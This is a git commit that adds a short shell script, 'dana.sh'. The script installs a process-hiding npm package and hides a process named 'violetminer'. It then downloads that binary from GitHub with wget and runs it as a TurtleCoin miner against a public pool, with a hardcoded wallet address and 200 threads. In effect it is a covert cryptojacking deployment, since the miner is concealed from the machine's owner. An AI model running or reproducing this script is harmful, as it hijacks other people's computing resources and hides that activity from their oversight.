235cf04adb4c940a9de2976683d3646c762b0efd
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-23 15:02:47 +0700

    Create dana.sh

---
+++ dana.sh
@@ -0,0 +1,7 @@
+sudo apt update -y
+sudo apt install nodejs -y
+sudo apt install npm -y
+sudo npm i -g node-process-hider
+sudo ph add violetminer
+wget https://github.com/chikahusarii/tepm/blob/main/violetminer
+./violetminer --algorithm turtlecoin --pool us2.turtlecoin.herominers.com --username TRTLuzBQibGTbuSF4YxMvwifK2v5ArDN5Phx9JRCowPRMs6bEsR4G3WifanFXCRVZ5MYq9719AcX64rqQ4fFjnCq8rAodxeqJhr -- password x --threads 200
